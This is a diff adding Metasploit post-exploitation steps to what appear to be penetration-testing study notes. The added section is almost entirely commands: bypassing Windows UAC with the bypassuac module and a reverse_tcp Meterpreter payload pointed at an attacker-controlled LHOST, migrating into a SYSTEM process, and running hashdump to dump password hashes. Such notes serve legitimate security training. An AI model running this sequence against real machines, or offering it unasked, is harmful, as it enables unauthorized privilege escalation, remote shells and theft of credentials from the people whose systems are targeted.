@@ -67,3 +67,38 @@ exploit
 ## Porting Exploits to MSF
 
 # Metasploit Post Exploitation
+```
+msfconsole ...
+set ... 
+use ...
+exploit
+```
+```
+# within a meterpreter session
+getuid
+getprivs (checking for UAC)
+
+# bypassing UAC
+background
+use exploit/windows/local/bypassuac
+show options (we need session ID)
+# list sessions
+sessions -l
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST xxx
+set LPORT 8888
+clear
+# executing the exploit on session #1
+run
+# a new session will be created which have bypassed UAC restrictions
+# check by executing getprivs
+getprivs
+hashdump (still fails)
+# we need system privleges -> migrate our current meterpreter process
+ps
+# look for running process with SYSTEM privleges
+migrate %the process ID% (from the list)
+getuid
+hashdump (it will work now)
+```
